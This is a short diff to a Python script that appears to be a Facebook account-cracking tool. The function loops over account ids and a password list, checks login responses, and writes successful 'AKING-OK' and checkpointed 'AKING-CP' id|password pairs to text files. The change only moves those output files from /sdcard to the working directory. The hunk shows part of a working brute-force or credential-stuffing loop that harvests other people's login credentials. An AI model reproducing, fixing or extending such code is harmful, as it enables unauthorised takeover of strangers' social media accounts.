@@ -470,13 +470,13 @@ def ffb(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
